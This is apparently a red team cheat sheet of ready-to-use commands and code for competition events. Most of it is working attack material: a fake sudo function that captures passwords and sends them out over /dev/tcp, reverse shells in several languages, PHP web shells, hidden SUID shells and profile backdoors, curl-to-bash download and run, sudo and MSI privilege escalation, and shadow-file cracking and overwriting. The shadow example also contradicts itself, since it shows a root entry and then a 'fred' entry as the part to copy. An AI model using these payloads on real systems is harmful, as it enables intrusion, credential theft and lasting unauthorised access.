# Red Team Strategies
Collection of red team strategies and generally useful snippets to reference during events.
## Misc

### Linux tty whackamole:
Runs continuously to kill any tty sessions that are not from your specific IP

&nbsp;&nbsp;&nbsp;&nbsp;<code>for i in 'w  -h | grep -v [your ip] | awk '{print $2}'';do pkill -9 -t $i;done</code>
### Windows RDP whackamole
Runs continuously to kill any RDP sessions that are not your specific connection. 
 1. Get the ID number for your connection using  <code>qwinsta</code>:
 &nbsp;&nbsp;&nbsp;&nbsp; <code> qwinsta </code>
 2. Use <code> rwinsta </code> to kill RDP sessions with different ID numbers
 
 &nbsp;&nbsp;&nbsp;&nbsp;<code>for /l %i in (1,0,2) do @ping -n 20 127.0.0.1 1>&2>nul & @rwinsta 3</code>
 
 &nbsp;&nbsp;&nbsp;&nbsp;*You can adjust the timing by pinging less or more* (<code>ping -n [number]</code>*where a smaller number will run more frequently. 
 
 &nbsp;&nbsp;&nbsp;&nbsp;Target additional RDP sessions by changing the id number supplied to* <code>rwinsta</code>

### Windows prevent specific app from staying open

&nbsp;&nbsp;&nbsp;&nbsp;<code>for /l %i in (1,0,2) do @ping -n 1 127.0.0.1 > nul && taskkill /IM calc.exe</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>for /l %i in (1,0,2) do @ taskkill /IM calc.exe</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>for /l %i in (1,0,2) do @wmic process where "name like '%calc.exe%'" call terminate</code>

### Chattr attrib
chattr on linux prevents a file from being modified by users until the chattr flag is removed, which requires root. It adds an additional hurdle for teams trying to modify specific files. Can be applied to files or directories.

&nbsp;&nbsp;&nbsp;&nbsp;<code>chattr +i [file/dir]</code> *adds chattr flag*

&nbsp;&nbsp;&nbsp;&nbsp;<code>chattr -i [file/dir]</code> *removes chattr flag*

### noclobber
The "no clobber" environment variable helps prevent the use of ">" for redirection of when writing to a file. It adds an additional hurdle to teams trying to modify specific files. It is tied to a user's shell session, so to make it more long lasting, add it to the bashrc file of any user. While set, you can still redirect to files using >| instead. 

For blue team, this could be an interesting tactic. Set the option on all blue team accounts so that if one is compromised and used by attacking team, the attacking team might be confused when trying to write with ">" if they are not familiar with noclobber.

&nbsp;&nbsp;&nbsp;&nbsp;<code>set -o noclobber</code> *prevents use of > to overwrite or append to files*

&nbsp;&nbsp;&nbsp;&nbsp;<code>set +o noclobber</code> *allows use of > to overwrite or append to files*

 ### Writing files
 There are many executables that can write files that may avoid some of the standard monitoring a defending team may put in place. Check out the following resources that list typical OS native commands for living off the land that support file writing:
 
https://gtfobins.github.io/#+file%20write

https://lolbas-project.github.io/


### Linux command alias 
Use alias names to trick teams into running commands on your behalf. Good for persistence. It does have some limitations with passing arguments. To handle that, check out linux functions.


&nbsp;&nbsp;&nbsp;&nbsp;<code>alias ww=”cd /var/www/html”</code> *creates an alias of ww that will change directories to /var/www/html *

&nbsp;&nbsp;&nbsp;&nbsp;<code>alias cd=”/tmp/evil_bin_file & cd”</code> *creates an alias of cd that will launch an evil bin file and then run cd *

### Linux Functions
todo

### Restricted shells
Set users to use restricted shells which limits the commands they are able to run. Edit /etc/passwd and change any user's default shell to an rshell that's on the system.

&nbsp;&nbsp;&nbsp;&nbsp;<code>root:x:0:0:root:/root:/usr/bin/rbash</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>root:x:0:0:root:/root:/usr/bin/rzsh</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>root:x:0:0:root:/root:/usr/bin/rsh</code>

If you set all users to have an rshell, anyone that logs in will have an rshell. If you want your defenders to have a normal shell, use a shell escape such as:

&nbsp;&nbsp;&nbsp;&nbsp;<code>vim -c ':!/bin/sh'</code>

more shell escapes here: https://gtfobins.github.io/#+shell

To hide the bin that used for the shell escape, rename it and add the . in the name like ".abc"

### Using the wall command
The wall command in linux echos output to all existing shell sessions for any user that is logged in. You can chat this way or you can troll by sending other things like a non-ending feed stream of random characters.

&nbsp;&nbsp;&nbsp;&nbsp;<code>cat /dev/urandom | wall</code>

### Determine who is logged on to what machine (windows)
If rpc ports are open and you have a valid admin level account on the windows system or domain you can query who is logged in where with wmic commands
&nbsp;&nbsp;&nbsp;&nbsp;<code>wmic /node:x.x.x.%i /user:administrator /password:adminpassword computersystem get username</code>

Ping sweep a range and then run the command: 
&nbsp;&nbsp;&nbsp;&nbsp;<code>for /L %i in (1,1,254) do @echo %i && @ping –n 1 x.x.x.%i | find /I “reply” && @wmic /node:x.x.x.%i /user:administrator /password:adminpassword computersystem get username</code>

*Note: If the password switch fails, omit it, and type in the pw interactively.*

### Remotely terminate processes (windows)
If rpc ports are open and you have a valid admin level account on the windows system or domain you can remotely run commands, like terminated processes

&nbsp;&nbsp;&nbsp;&nbsp;<code>wmic /node:x.x.x.%i /user:administrator /password:adminpassword process where "name like '%calc.exe%'" call terminate</code>

*Note: If the password switch fails, omit it, and type in the pw interactively.*

### Remotely create processes (windows)
If rpc ports are open and you have a valid admin level account on the windows system or domain you can remotely run commands, non-interactive processes (no gui)

&nbsp;&nbsp;&nbsp;&nbsp;<code>wmic /node:x.x.x.%i /user:administrator /password:adminpassword process call create \\path\to\app</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>wmic /node:x.x.x.%i /user:administrator /password:adminpassword process call create 'cmd.exe /c [command]' </code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>wmic /node:x.x.x.%i /user:administrator /password:adminpassword process call create 'cmd.exe /c [command] >> \\your\writeable\share\restults.txt' </code>*to view results from your command (if needed) you need to send the results to a share*

*Note: If the password switch fails, omit it, and type in the pw interactively.*

### Compromising the linux user creation process
You can modify a few files and directories to get code execution anytime a new user is created - remember root or a super user is needed to create an account so whatever you add gets executed as root or a super user. You can also modify the account profiles, including bashrc if you want to set new aliases or functions for example. 

Adding a malicious bin (callback would be good) file to be called during the user creation process:

 1. Copy your bin file to the system somewhere in the normal path locations like /usr/bin
 2. <code>echo "usr/bin/evilbin" &" >> /etc/profile</code> *adds line in profile script to run our evil bin*
 3. <code>echo "usr/bin/evilbin" &" >> /etc/skel/.profile</code> *adds line in skel outline .profile script to run our evil bin. /etc/skel is what is copied to all new users' home directories upon creation*
 4. <code> chmod u+s /usr/bin/evilbin & chmod u+x /usr/bin/evilbin</code>*sets suid and execute permissions on the evilbin*
 5. <code> chattr +i /etc/skel/.profile /etc/profile /usr/bin/evilbin</code>

### Enum for setuid binaries on linux
&nbsp;&nbsp;&nbsp;&nbsp;<code>find / -perm -4000 -type f 2>/dev/null</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>find / perm -u=s -type f 2>/dev/null</code>

### Add private key to authorized keys file
Create a team ssh key and drop it into any authorzied_keys files you can in user directories under .ssh

### Privesc for nmap if allowed by sudo
&nbsp;&nbsp;&nbsp;&nbsp;<code>echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse</code>

### Copy existing shells with suid and hide them for persistence 

 1. <code>cp /bin/bash /.svc</code>
 2. <code>chmod u+s /.svc & chmod u+x /.svc</code>
 3.  <code>touch -d "5 January 2021" /.svc</code>
 4.  <code>chattr +i /.svc</code>

###CMDKey stores creds on windows systems
You can cache creds through runas on windows systems which will allow anyone to runas a given user with those cached creds. Check for the following:

&nbsp;&nbsp;&nbsp;&nbsp;<code>cmdkey /list</code>
&nbsp;&nbsp;&nbsp;&nbsp;<code>runas /savecred /user:admin C:\PrivEsc\reverse.exe</code>*if you find the admin account for example, run it like this*

### Windows post compromise manual enum


&nbsp;&nbsp;&nbsp;&nbsp;<code>dir /s *pass* == *.config</code> *searches for 'pass' in all config files*

&nbsp;&nbsp;&nbsp;&nbsp;<code>findstr /si password *.xml *.ini *.txt</code> *searches for 'password' in multiple files*

&nbsp;&nbsp;&nbsp;&nbsp;<code>Findstr /simp string \\share\location\*.config</code> *searches for a string in all .config files in all directories*

&nbsp;&nbsp;&nbsp;&nbsp;<code>dir /s *pass* == *cred* == *vnc* == *.config*</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>findstr /si password *.xml *.ini *.txt</code>

### Other useful windows files to check

&nbsp;&nbsp;&nbsp;&nbsp;<code>c:\sysprep.inf</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>c:\sysprep\sysprep.xml</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>%WINDIR%\Panther\Unattend\Unattended.xml</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>%WINDIR%\Panther\Unattended.xml</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>sysvol policy files containing cPassword on a domain controller</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>%SYSTEMROOT%\SYSVOL\sysvol</code>
 
&nbsp;&nbsp;&nbsp;&nbsp;<code>Services\Services.xml: Element-Specific Attributes</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>Printers\Printers.xml: SharedPrinter Element</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>Drives\Drives.xml: Element-Specific Attributes</code>
 
&nbsp;&nbsp;&nbsp;&nbsp;<code>DataSources\DataSources.xml: Element-Specific Attributes</code>
 
### Elevated software install
 
If the following registry keys contain "AlwaysInstallElevated" value 0x1, then any MSI run will run as admin. For exmaple: 

&nbsp;&nbsp;&nbsp;&nbsp;<code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code> or

&nbsp;&nbsp;&nbsp;&nbsp;<code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code>

then create an install package:

&nbsp;&nbsp;&nbsp;&nbsp;<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=Your_IP LPORT=Your_port -f msi -o shell.msi</code>

&nbsp;&nbsp;&nbsp;&nbsp;<code>msiexec /quiet /qn /i C:\Temp\shell.msi</code>

### Change dates on files

Often when uploading files or modifying existing files, the date stamps can be a clue that this file is out of the ordinary. Use the <code>touch</code> command to hide them.

&nbsp;&nbsp;&nbsp;&nbsp;<code>touch -d "5 January 2021" /.abc</code>

### Malicious sudo replacement

add this function to .bashrc in users' profile. If they use bash, the next time they open a session and sudo, the pw will be sent to the web server you run or alternatively you can write it to a file

~~~
function sudo () 
{ 
    realsudo="/usr/bin/sudo"
    #read -s "inputPasswd?[sudo] password for $USER: " #use this line for ZSH
    read -s -p "[sudo] password for $USER: " inputPasswd #use this line for bash
    printf "\n"
  #  printf '%s\n' "$USER : $inputPasswd" > /tmp/llcv #use this to write to a file
    encoded=$(printf '%s' "$USER : $inputPasswd" | base64) > /dev/null 2>&1    
   # curl -s "http://127.0.0.1:8989/$encoded" > /dev/null 2>&1 #use this for zsh
    exec 3<>/dev/tcp/127.0.0.1/80;echo -e "GET /bash$encoded HTTP/1.1\r\nhost: http://127.0.0.1\r\nConnection: close\r\n\r\n" >&3 #edit this line with your webserver that is listening
    $realsudo -S -u root bash -c "exit" <<< "$inputPasswd" > /dev/null 2>&1
    $realsudo "${@:1}"
}
 
~~~

### Malicious binary replacement
add this function to .bashrc in users' profile. If they use bash the next time the run the command you specify, it will also execute whatever you want and also run the user's requested command. you have to edit the function name to match a common bin file name, update the cmd to point to the full path of the bin the user is actually requesting, and update the payload that you want to run. This example will run whenever a user runs the 'ls' command.

~~~
function ls () 
{ 
    cmd="/usr/bin/ls"
    $cmd "${@:1}"
    echo "flag value you want to write here" > /tmp/flag
}
~~~

### Quick mountable SMB share from a linux redteam box

On the system acting as a server:

&nbsp;&nbsp;&nbsp;&nbsp;<code>impacket-smbserver -smb2support -username batman -password superman files /tmp</code>

From a client, create a mount point wherever you want, and then mount the share using:

&nbsp;&nbsp;&nbsp;&nbsp;<code>sudo mount t cifs -o ver=2.0,username=user_name,password=password //server_name/share_name /mnt/share_name</code>

### Linux file write script

~~~
#!/bin/bash

f = 'our flag'
file = 'flag file'

if ! grep $f $file; then
    echo $f > $file; history -c  
fi
~~~

### Linux pager abuse

When a file is opene a tool that creates multiple pages beyond the bounds of your terminal window size, it uses a pager to make pages. These can be abused to launch commands. This is especially useful if the tool used is in sudo list. 

&nbsp;&nbsp;&nbsp;&nbsp;<code> 1. Using less or more or man, etc, which accept commands by giving a ! And command like !sh </code>

&nbsp;&nbsp;&nbsp;&nbsp;<code> 2. Open large file, type anything and then give it !/bin/sh or !sh etc! </code>

### sudo cve CVE-2019-14287

If sudo is < 1.8.28 there's an easy bypass to root

&nbsp;&nbsp;&nbsp;&nbsp;<code>sudo -u#-1 /bin/bash</code>

### php one liners

just some useful php one liner commands if you can get code exec in php
~~~
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

<?php $sock=fsockopen("192.168.1.12",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>

<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f"); ?>

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'");?>

~~~

### reverse shells

~~~
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f #if you encounter the nc without -e option

powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('<LISTENERIP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 ~~~
 
 ### Quick setuid binary
 
 useful if you can get a process like a cron job to run a binary for example...
 
 
 make a file with this:
 
 ~~~
 #include <unistd.h>
int main(void)
{
setuid(0);
setgid(0);
system("/bin/bash");
}
~~~

then compile and run it as root

~~~
gcc exploit.c -m32 -o exploit
~~~

### Using WMIC to runas a different user in a non-interactive session

By default in Windows, you cannot use the <code>runas</code> without on interactive shell/cmd prompt (typical if you just have an nc shell or just remote code execution for some one-liners). So, you can use wmic to launch a process with a password on the cmd line as another user. Bonus points if you have admin creds

~~~
c:\Users\mssql-svc\Desktop>wmic /user:backdoor2 /password:password123 process call create "c:\users\mssql-svc\desktop\nc.exe 10.10.14.3 444 -e c:\windows\system32\cmd.exe"
~~~

### upgrade your shell

Often your nc shell lacks a lot of useful features... you can upgrade it to perform better

~~~
python -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo & fg
~~~

### File transfers with enum scripts

avoid having review your enum script output on the victim machine by hosting your enum script in a webserver and sending output back to your listener

open a webserver to host your enum tool:

<code>python3 -m http.server 8888</code> OR <code>python2 -m Simple.HTTP.Server 8888</code>

open a listener and your attacking system: 

<code>nc -lnvp 8888 -w 5 > output.txt</code>

transfer and execute the enum tool:

<code>curl http://[attackerip:port]/linenum.sh | bash -i > /dev/tcp/[attackerip]/8888</code> or <code>curl http://[attackerip:port]/linenum.sh | bash -i | nc [attackerip] [port]</code>

On Windows, run an smb server to listen for the inbound output from the tool

<code> impacket-smbserver smb ~/smb </code>

<code>PS > IEX (new-object net.webclient).downloadstring('http://[attackerip:port]/enum.ps1') > \\[attackerip]\smb\output.txt</code>
 
### /etc/shadow - cracking and overwriting

#### copy hash from the second position (: delimited) and crack it:

<code>root:$6$5l70Gupv$xBTxhCSexudn5jJ9hampIfTK0KIR3nqK1K1Rxye.OA5obtKArO7jgftjJtVSdp31MPxItEPmOuWhbgBvp0wqn.:16737:0:99999:7:::</code> you want the <code>fred:$6$5l70Gupv$xBTxhCSexudn5jJ9hampIfTK0KIR3nqK1K1Rxye.OA5obtKArO7jgftjJtVSdp31MPxItEPmOuWhbgBvp0wqn.:16737:0:99999:7:::</code> part

use john to crack it: 
<code> john --format=sha512crypt --wordlist=pathtowordlist hash.txt </code>

to crack with hashcat... you need to remove the salt from the hash first:

<code>$6$5l70Gupv$</code> is the salt, so the remaining part of the hash you want is 
<code>xBTxhCSexudn5jJ9hampIfTK0KIR3nqK1K1Rxye.OA5obtKArO7jgftjJtVSdp31MPxItEPmOuWhbgBvp0wqn.</code>
 
<code>hashcat -m 1800 hashfile /usr/share/wordlists/rockyou.txt --force</code>

#### overwriting

If you can write to /etc/shadow in some way, you can edit the pw hash for any account and the login with it

~~~
mkpasswd -m sha-512 password
$6$Pp.gr7cKYj679e87$U8OdJicmXGASzEhI.QGHNBMg2/JIgA8j8bSGB2pl7nE4ZFLcvjT58qhbAZq42mB0mtO2OztIFTuQaKSeqQO7h1
~~~
copy the new password hash to the second field of any user in the shadow file and login with that password you've just created
